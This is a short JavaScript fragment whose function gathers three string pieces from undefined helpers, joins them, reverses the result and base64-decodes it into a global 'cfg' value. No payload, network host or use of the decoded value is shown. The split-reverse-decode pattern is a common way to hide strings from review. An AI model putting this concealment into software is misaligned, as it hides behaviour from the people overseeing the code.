let cfg = "";

async function g1() {
    const [m1, m2, m3] = await Promise.all([
        p4(),
        q3(),
        x25()
    ]);

    const mix = (m1 + m2 + m3).trim();

    cfg = atob(
        mix.split("").reverse().join("")
    );

    return cfg;
}
